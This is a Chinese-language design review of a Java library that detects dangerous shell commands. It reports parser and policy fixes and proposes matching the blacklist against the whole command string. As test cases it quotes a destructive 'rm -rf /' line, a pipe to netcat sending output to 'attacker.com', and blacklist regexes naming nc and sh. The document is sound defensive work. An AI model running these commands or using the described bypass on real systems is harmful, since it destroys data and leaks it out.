## 2. 阶段一：架构与鲁棒性改进评估 (已完成)

本阶段针对早期发现的四个核心设计缺陷进行了修复验证。

### 2.1 解析能力加固：状态机提取器
*   **改进点**: `ShellCommandExtractor` 放弃了简单的正则分割，改为支持**单/双引号嵌套**及**转义字符（`\`）**的状态机解析。
*   **防御效果**: 有效解决了 `echo "hello; rm -rf /"` 等混淆手段导致的误报或绕过风险。
*   **代码参考**: `src/main/java/com/example/shelldetector/parser/ShellCommandExtractor.java`

### 2.2 安全策略收紧：解析失败默认拦截
*   **改进点**: 在 `DetectionEngine` 中，当解析异常且配置为不抛异常时，逻辑由“直接放行”改为**“视为 DANGER 风险拦截”**。
*   **防御效果**: 符合“默认拒绝”的安全原则。恶意混淆通常导致解析失败，拦截此类命令能有效拦截 WebShell 变体。

### 2.3 规则冲突检测：静态扫描机制
*   **改进点**: 新增 `RuleConflictChecker`并在 `Builder.build()` 时自动触发，检测黑白名单间的正则重叠。
*   **效果**: 满足了“冲突提示用户”的需求，提升了规则库的可维护性和确定性。

### 2.4 Builder 模式配置修复
*   **改进点**: 修复了 `withThreshold` 导致的配置覆盖 Bug。
*   **效果**: 确保了 Fluent API 在链式调用中配置的完整性和一致性。

## 3. 阶段二：安全逻辑深层风险 (待改进)

本阶段识别出了由于“子命令拆分”导致的黑名单规则盲区。

### 3.1 风险：分隔符/操作符匹配盲区
目前的 `ShellCommandExtractor` 会在拆分时丢弃管道符（`|`）、分号（`;`）和后台符（`&`）。

*   **逻辑漏洞**: `DetectionEngine` 仅对**拆分后**的子命令做黑名单检测。由于分隔符已消失，黑名单中定义的 `\|` 等规则将永远无法被命中。
*   **绕过场景**: 执行 `ls | nc attacker.com 1234`。即使黑名单禁止管道符，只要 `nc` 未被精确拦截，该管道反弹行为就会成功。

### 3.2 改进建议：引入“原始整串黑名单匹配”
为了在不破坏“白名单优先”原则的前提下加固防御，必须补全对原始字符串的审计。

**核心代码修正建议 (`DetectionEngine.java`)**:
```java
// 步骤 4：检测黑名单规则
List<Rule> allMatchedRules = new ArrayList<>();

// 【新增】：针对原始完整命令进行一次黑名单全量扫描
// 目的：捕获在拆分过程中丢失的管道符 | 、分号 ; 等符号
allMatchedRules.addAll(ruleMatcher.matchBlacklist(entireCommand, rules));

// 【原有】：针对拆分后的具体子命令进行扫描
for (String cmd : commands) {
    allMatchedRules.addAll(ruleMatcher.matchBlacklist(cmd, rules));
}
```

---

## 4. 关键设计一致性评估

*   **重定向符 ( > )**: 目前保留在子命令内部，黑名单正则 `\s*>\s*` 依然有效，防御逻辑完备。
*   **白名单优先 (Whitelist Precedence)**: 上述“整串黑名单匹配”不会影响白名单。合法的命令（如 `ls | grep`）若在白名单全匹配中通过，将直接返回 `PASS`，永远不会进入整串黑名单扫描。
*   **推荐策略**: 在黑名单中不仅拦截单个 `|`，建议增加 `\|.*sh\b` 或 `\|.*nc\b` 等组合模式，以精准防御管道反弹攻击。
